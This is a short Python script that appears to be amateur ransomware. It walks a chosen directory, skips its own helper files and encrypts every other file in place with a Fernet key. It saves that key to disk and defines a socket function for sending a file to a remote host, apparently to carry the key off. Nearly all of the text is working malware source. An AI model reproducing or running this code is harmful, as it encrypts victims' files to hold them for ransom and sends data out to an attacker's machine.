#!/usr/bin/env python3
from cryptography.fernet import Fernet
import os
import socket
import os
import subprocess
import sys
import tqdm
SEPARATOR = "<SEPARATOR>"



BUFFER_SIZE = 1024 * 128


files = []
path = "$YOURPATH$"
for file in os.listdir(path):

#change the files so that this doesnt encrpyt any imp files you need
    if(file == "attacker.py"):


	     continue
    if(file == "client_server.py"):

	     continue
    if(file == "thekey.key"):
	     continue
    if(file == "decrypt.py"):
	     continue
    files.append(file)

print(files)
key = Fernet.generate_key()
#print(key)

for file in files:
	with open(file,"rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file,"wb")as thefile:
    	        thefile.write(contents_encrypted)
with open("thekey.key","wb")as theefile:
	theefile.write(key)


#s.send(thisthing)
#s.send(key)

def send_file(filename, host, port):
    # get the file size
    filesize = os.path.getsize(filename)
    # create the client socket
    s = socket.socket()
    print(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))
    print("[+] Connected.")

    # send the filename and filesize
    s.send(f"{filename}{SEPARATOR}{filesize}".encode())

    # start sending the file
    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in 
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))

    # close the socket
    s.close()
                					
